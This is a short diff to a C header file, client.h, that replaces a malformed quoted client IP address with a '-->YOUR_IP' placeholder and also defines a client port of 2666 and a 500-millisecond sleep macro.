@@ -1,7 +1,7 @@
 #ifndef __CLIENT_H
 #define __CLIENT_H
 
-#define CLIENT_IP "-->YOUR_IP
+#define CLIENT_IP -->YOUR_IP
 #define CLIENT_PORT 2666
 
 #define CLIENT_SLEEP_BETWEEN_FUNC() Sleep(500)
